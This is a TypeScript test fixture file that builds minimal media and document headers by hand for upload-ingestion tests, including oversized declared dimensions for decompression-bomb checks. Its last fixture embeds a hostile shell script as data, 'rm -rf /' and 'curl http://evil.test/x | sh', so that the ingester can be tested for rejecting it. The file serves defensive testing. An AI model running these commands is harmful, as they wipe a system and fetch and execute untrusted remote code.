/**
 * Minimal binary fixtures for the A13 ingestion tests.
 *
 * Every buffer is built by hand so no test needs a real media file, a network
 * fetch or a new dependency. Image headers are truncated on purpose: the
 * ingestion path must reject on the DECLARED dimensions before any decoder
 * could allocate (decompression-bomb defense), which is exactly what these
 * fixtures simulate.
 */

export const PNG_SIGNATURE = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];

/** PNG with a real IHDR chunk header (width/height) and nothing else. */
export const pngBytes = (width: number, height: number): Uint8Array => {
  const bytes = new Uint8Array(33);
  bytes.set(PNG_SIGNATURE, 0);
  // IHDR length (13) — big endian uint32 at offset 8.
  bytes[8] = 0x00; bytes[9] = 0x00; bytes[10] = 0x00; bytes[11] = 0x0d;
  // "IHDR" at offset 12.
  bytes[12] = 0x49; bytes[13] = 0x48; bytes[14] = 0x44; bytes[15] = 0x52;
  const view = new DataView(bytes.buffer);
  view.setUint32(16, width);
  view.setUint32(20, height);
  // bit depth / colour type / compression / filter / interlace placeholders.
  bytes[24] = 8; bytes[25] = 6; bytes[26] = 0; bytes[27] = 0; bytes[28] = 0;
  // CRC placeholder — never validated by the ingestion path.
  view.setUint32(29, 0);
  return bytes;
};

export const JPEG_SOF0 = 0xc0;

/** JPEG with an APP0 segment followed by a real SOF0 (height/width). */
export const jpegBytes = (width: number, height: number): Uint8Array => {
  const bytes = new Uint8Array(30);
  const view = new DataView(bytes.buffer);
  bytes[0] = 0xff; bytes[1] = 0xd8; bytes[2] = 0xff;
  // APP0 (JFIF) marker + 16-byte segment.
  bytes[3] = 0xe0;
  view.setUint16(4, 16);
  bytes[6] = 0x4a; bytes[7] = 0x46; bytes[8] = 0x49; bytes[9] = 0x46; bytes[10] = 0x00;
  // SOF0 marker + 15-byte segment.
  bytes[20] = 0xff; bytes[21] = JPEG_SOF0;
  view.setUint16(22, 15);
  bytes[24] = 8; // sample precision
  view.setUint16(25, height);
  view.setUint16(27, width);
  bytes[29] = 1; // component count
  return bytes;
};

export const pdfBytes = (major = 1, minor = 7): Uint8Array => {
  const header = new TextEncoder().encode(`%PDF-${major}.${minor}\n`);
  const body = new TextEncoder().encode("1 0 obj\n<< /Type /Catalog >>\nendobj\n");
  const out = new Uint8Array(header.length + body.length);
  out.set(header, 0);
  out.set(body, header.length);
  return out;
};

/** EBML header carrying the "webm" DocType (browser MediaRecorder output). */
export const webmBytes = (): Uint8Array => {
  const out = new Uint8Array(64);
  out.set([0x1a, 0x45, 0xdf, 0xa3], 0);
  out.set(new TextEncoder().encode("webm"), 32);
  return out;
};

/** MP4/M4A container: bytes 4..8 = "ftyp", 8..12 = major brand. */
export const isobmffBytes = (brand: string): Uint8Array => {
  const bytes = new Uint8Array(24);
  const view = new DataView(bytes.buffer);
  bytes.set(new TextEncoder().encode("ftyp"), 4);
  bytes.set(new TextEncoder().encode(brand), 8);
  view.setUint32(16, 512);
  view.setUint32(20, 512);
  return bytes;
};

export const ascii = (value: string): Uint8Array => new TextEncoder().encode(value);

/** `OggS` + vorbis-ish payload. */
export const oggBytes = (): Uint8Array => {
  const out = new Uint8Array(32);
  out.set(ascii("OggS"), 0);
  return out;
};

/** `RIFF` .... `WAVE`. */
export const wavBytes = (): Uint8Array => {
  const out = new Uint8Array(32);
  const view = new DataView(out.buffer);
  out.set(ascii("RIFF"), 0);
  view.setUint32(4, 24, true);
  out.set(ascii("WAVE"), 8);
  out.set(ascii("fmt "), 12);
  return out;
};

/**
 * A REAL 16-bit PCM WAV header (44 bytes) plus a `data` chunk whose declared
 * size encodes the requested duration at 8 kHz mono. Only the header is
 * meaningful to the ingestion path — the "samples" are zeroed — which is
 * exactly what lets the duration be computed without decoding anything.
 */
export const wavBytesWithDuration = (seconds: number, sampleRate = 8_000): Uint8Array => {
  const channels = 1;
  const bitsPerSample = 16;
  const byteRate = (sampleRate * channels * bitsPerSample) / 8;
  const dataSize = Math.round(byteRate * seconds);
  const out = new Uint8Array(44 + dataSize);
  const view = new DataView(out.buffer);
  out.set(ascii("RIFF"), 0);
  view.setUint32(4, 36 + dataSize, true);
  out.set(ascii("WAVE"), 8);
  out.set(ascii("fmt "), 12);
  view.setUint32(16, 16, true); // PCM fmt chunk size
  view.setUint16(20, 1, true); // audioFormat = PCM
  view.setUint16(22, channels, true);
  view.setUint32(24, sampleRate, true);
  view.setUint32(28, byteRate, true);
  view.setUint16(32, channels * (bitsPerSample / 8), true);
  view.setUint16(34, bitsPerSample, true);
  out.set(ascii("data"), 36);
  view.setUint32(40, dataSize, true);
  return out;
};

/** `fLaC` + STREAMINFO placeholder. */
export const flacBytes = (): Uint8Array => {
  const out = new Uint8Array(32);
  out.set(ascii("fLaC"), 0);
  return out;
};

/** MPEG audio frame sync (0xFFEx) — no ID3 tag. */
export const mpgaBytes = (): Uint8Array => {
  const out = new Uint8Array(64);
  out[0] = 0xff;
  out[1] = 0xfb;
  return out;
};

/** ID3v2-tagged MP3. */
export const mp3Bytes = (): Uint8Array => {
  const out = new Uint8Array(64);
  out.set(ascii("ID3"), 0);
  out[3] = 0x04;
  out[4] = 0x00;
  return out;
};

/** MPEG-1 video pack header — recognized, but NOT a permitted V1 kind. */
export const mpegVideoBytes = (): Uint8Array => {
  const out = new Uint8Array(64);
  out.set([0x00, 0x00, 0x01, 0xba], 0);
  return out;
};

/** A shell script that a naive "text/plain" ingest would happily store. */
export const scriptBytes = (): Uint8Array =>
  ascii("#!/bin/sh\nrm -rf /\ncurl http://evil.test/x | sh\n");
